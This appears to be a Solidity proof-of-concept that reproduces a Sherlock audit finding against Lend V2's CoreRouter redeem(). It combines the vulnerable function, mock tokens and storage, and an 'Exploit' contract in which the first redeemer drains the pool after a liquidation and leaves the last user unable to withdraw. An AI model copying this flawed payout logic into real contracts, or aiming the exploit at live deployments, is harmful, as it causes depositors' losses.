// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Lend V2 finding 58386 (H-17):
// "If CoreRouter is liquidated, some user may suffer more loss than expected."
//
// Real audited source (the vulnerable redeem() is reproduced VERBATIM, the
// vulnerable line is marked @>):
//   repo   github.com/sherlock-audit/2025-05-lend-audit-contest
//   file   Lend-V2/src/LayerZero/CoreRouter.sol
//   fn     redeem  (L100-L138)
//   report github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/824
//
// Root cause: CoreRouter is a single pooled account that is BOTH supplier and
// borrower inside the underlying LToken (Compound-style) market, so it can be
// liquidated in that market — reducing its LToken share balance. redeem() pays
// each user `_amount * exchangeRateBefore / 1e18` (the @> line) computed purely
// from the LToken exchange rate, NEVER from CoreRouter's actual remaining LToken
// collateral. After CoreRouter is liquidated, the users who redeem first are
// paid in full, draining the pool, while the last redeemer's on-chain
// `LToken.redeem` reverts for lack of CoreRouter shares — they can withdraw
// nothing and lose their entire supplied collateral.
//
// The vulnerable arithmetic is byte-for-byte the on-chain source. Non-vulnerable
// dependencies (LToken exchange-rate/redeem, LendStorage accounting, liquidity
// check) are faithful minimal doubles with real transfers and real accounting.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

interface LTokenInterface {
    function exchangeRateStored() external view returns (uint256);
}

interface LErc20Interface {
    function redeem(uint256 redeemTokens) external returns (uint256);
}

/// @dev Faithful minimal ERC20 double for the pool's underlying token.
contract MockToken is IERC20 {
    string public name = "Lend Underlying";
    string public symbol = "USD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

/// @dev Faithful double of the Compound-style LToken (cToken) that pools
///      CoreRouter's collateral. `balanceOf` tracks LToken shares; the pool
///      holds the underlying reserve. `redeem` burns the caller's shares and
///      pays out underlying at the exchange rate; it returns a NON-ZERO error
///      code (Compound convention) when the caller lacks the shares — this is
///      exactly what strands the last redeemer once CoreRouter is liquidated.
contract LToken {
    MockToken public underlying;
    uint256 public exchangeRate = 1e18; // 1 share == 1 underlying
    mapping(address => uint256) public balanceOf; // LToken share balance
    uint256 public totalShares;

    constructor(MockToken u) {
        underlying = u;
    }

    function exchangeRateStored() external view returns (uint256) {
        return exchangeRate;
    }

    /// @dev Faithful setup helper: credit `holder` with freshly minted shares
    ///      backed 1:1 by underlying already funded into this pool.
    function mintShares(address holder, uint256 shares) external {
        balanceOf[holder] += shares;
        totalShares += shares;
    }

    /// @dev Compound-style redeem: burns caller shares, pays underlying. Returns
    ///      non-zero on insufficient shares instead of reverting (mirrors cToken).
    function redeem(uint256 redeemTokens) external returns (uint256) {
        if (balanceOf[msg.sender] < redeemTokens) return 1; // insufficient shares -> error code
        balanceOf[msg.sender] -= redeemTokens;
        totalShares -= redeemTokens;
        uint256 underlyingAmt = (redeemTokens * exchangeRate) / 1e18;
        underlying.transfer(msg.sender, underlyingAmt);
        return 0;
    }

    /// @dev Models CoreRouter being liquidated in THIS market: an external
    ///      liquidator seizes `seizeShares` of CoreRouter's LToken shares
    ///      (they transfer to the liquidator, who now controls that collateral).
    ///      CoreRouter's share balance drops below the pooled users' recorded
    ///      total, while LendStorage's per-user totals are untouched.
    function liquidateSeize(address victim, address liquidator, uint256 seizeShares) external {
        balanceOf[victim] -= seizeShares;
        balanceOf[liquidator] += seizeShares;
    }
}

/// @dev Faithful minimal LendStorage double: per-user LToken share accounting
///      plus the hypothetical-liquidity view redeem() consults.
contract LendStorage {
    mapping(address => address) public lTokenToUnderlying;
    // user => lToken => shares supplied (mirror of what user is owed)
    mapping(address => mapping(address => uint256)) public totalInvestment;

    function setUnderlying(address lToken, address underlying) external {
        lTokenToUnderlying[lToken] = underlying;
    }

    function seedInvestment(address user, address lToken, uint256 shares) external {
        totalInvestment[user][lToken] = shares;
    }

    function updateTotalInvestment(address user, address lToken, uint256 amount) external {
        totalInvestment[user][lToken] = amount;
    }

    function distributeSupplierLend(address, address) external {}

    function removeUserSuppliedAsset(address, address) external {}

    /// @dev These borrowers hold no debt, so `borrowed` is 0 and the position
    ///      stays solvent on paper — the liquidity gate never blocks the redeem.
    ///      Collateral is the user's remaining share value after the hypothetical
    ///      redeem, exactly as the real accounting computes it.
    function getHypotheticalAccountLiquidityCollateral(address account, LToken lToken, uint256 redeemTokens, uint256)
        external
        view
        returns (uint256 borrowed, uint256 collateral)
    {
        uint256 shares = totalInvestment[account][address(lToken)];
        uint256 remaining = shares > redeemTokens ? shares - redeemTokens : 0;
        collateral = (remaining * lToken.exchangeRateStored()) / 1e18;
        borrowed = 0;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — redeem() is reproduced VERBATIM from the audited source
// (CoreRouter.sol L100-L138). Only the surrounding plumbing is a faithful double.
// ─────────────────────────────────────────────────────────────────────────────
contract CoreRouter {
    LendStorage public immutable lendStorage;

    event RedeemSuccess(address indexed redeemer, address indexed lToken, uint256 redeemAmount, uint256 redeemTokens);

    constructor(address _lendStorage) {
        lendStorage = LendStorage(_lendStorage);
    }

    function redeem(uint256 _amount, address payable _lToken) external returns (uint256) {
        // Redeem lTokens
        address _token = lendStorage.lTokenToUnderlying(_lToken);

        require(_amount > 0, "Zero redeem amount");

        // Check if user has enough balance before any calculations
        require(lendStorage.totalInvestment(msg.sender, _lToken) >= _amount, "Insufficient balance");

        // Check liquidity
        (uint256 borrowed, uint256 collateral) =
            lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender, LToken(_lToken), _amount, 0);
        require(collateral >= borrowed, "Insufficient liquidity");

        // Get exchange rate before redeem
        uint256 exchangeRateBefore = LTokenInterface(_lToken).exchangeRateStored();

        // Calculate expected underlying tokens
        uint256 expectedUnderlying = (_amount * exchangeRateBefore) / 1e18; // @> VULN: payout uses only the exchange rate, never CoreRouter's actual remaining collateral in the LToken — a liquidated CoreRouter overpays early redeemers and strands the last one

        // Perform redeem
        require(LErc20Interface(_lToken).redeem(_amount) == 0, "Redeem failed");

        // Transfer underlying tokens to the user
        IERC20(_token).transfer(msg.sender, expectedUnderlying);

        // Update total investment
        lendStorage.distributeSupplierLend(_lToken, msg.sender);
        uint256 newInvestment = lendStorage.totalInvestment(msg.sender, _lToken) - _amount;
        lendStorage.updateTotalInvestment(msg.sender, _lToken, newInvestment);

        if (newInvestment == 0) {
            lendStorage.removeUserSuppliedAsset(msg.sender, _lToken);
        }

        emit RedeemSuccess(msg.sender, _lToken, expectedUnderlying, _amount);

        return 0;
    }
}

/// @dev Honest second supplier who tries to redeem AFTER the pool is drained.
contract User {
    CoreRouter public router;

    constructor(CoreRouter r) {
        router = r;
    }

    function tryRedeem(uint256 amount, address payable lToken) external returns (bool ok) {
        try router.redeem(amount, lToken) returns (uint256) {
            ok = true;
        } catch {
            ok = false;
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: two honest users each supply 1000. CoreRouter is liquidated in
// the LToken (500 shares seized). The Exploit (first redeemer) still gets its
// full 1000 at the stale exchange rate, draining the pool; the honest second
// user's redeem then reverts and they lose their entire 1000 collateral.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    MockToken public token;
    LToken public lToken;
    LendStorage public lendStorage;
    CoreRouter public vuln;
    User public honest;

    address internal constant LIQUIDATOR = address(0xBEEF);

    uint256 internal constant SUPPLY_EACH = 1000e18;
    uint256 internal constant SEIZED = 500e18; // CoreRouter liquidated: shares lost

    uint256 public firstRedeemerReceived; // Exploit's payout
    bool public lastRedeemerFailed; // honest user stranded?
    uint256 public honestLoss; // collateral the honest user can never recover
    uint256 public profit; // Exploit's realized underlying balance

    constructor() {
        token = new MockToken(); // child nonce 1  (drained/affected token)
        lToken = new LToken(token); // child nonce 2
        lendStorage = new LendStorage(); // child nonce 3
        vuln = new CoreRouter(address(lendStorage)); // child nonce 4  (VULN: verbatim redeem)
        honest = new User(vuln); // child nonce 5  (honest last redeemer)

        // Wire storage.
        lendStorage.setUnderlying(address(lToken), address(token));

        // Two honest depositors each supplied 1000: pool holds 2000 underlying,
        // CoreRouter holds 2000 LToken shares, per-user totals recorded.
        token.mint(address(lToken), SUPPLY_EACH * 2);
        lToken.mintShares(address(vuln), SUPPLY_EACH * 2);
        lendStorage.seedInvestment(address(this), address(lToken), SUPPLY_EACH); // Exploit is user 1
        lendStorage.seedInvestment(address(honest), address(lToken), SUPPLY_EACH); // honest user 2
    }

    function run() external {
        address payable lt = payable(address(lToken));

        // External event: CoreRouter is liquidated in the LToken market. 500 of
        // its shares are seized, so it now backs only 1500 of the 2000 recorded.
        lToken.liquidateSeize(address(vuln), LIQUIDATOR, SEIZED);

        // 1) Exploit redeems FIRST — paid the full 1000 at the stale rate.
        uint256 balBefore = token.balanceOf(address(this));
        vuln.redeem(SUPPLY_EACH, lt);
        firstRedeemerReceived = token.balanceOf(address(this)) - balBefore;

        // 2) Honest user redeems SECOND — CoreRouter is out of shares, revert.
        bool ok = honest.tryRedeem(SUPPLY_EACH, lt);
        lastRedeemerFailed = !ok;

        // Honest user's recorded collateral is intact on paper but unrecoverable.
        honestLoss = lendStorage.totalInvestment(address(honest), address(lToken));
        profit = token.balanceOf(address(this));

        // Harm: the first redeemer extracts full value while a liquidated
        // CoreRouter can no longer honor the last redeemer, who loses everything.
        require(firstRedeemerReceived == SUPPLY_EACH, "first redeemer not paid in full");
        require(lastRedeemerFailed, "last redeemer was NOT stranded");
        require(honestLoss == SUPPLY_EACH, "honest user did not suffer full loss");
    }
}
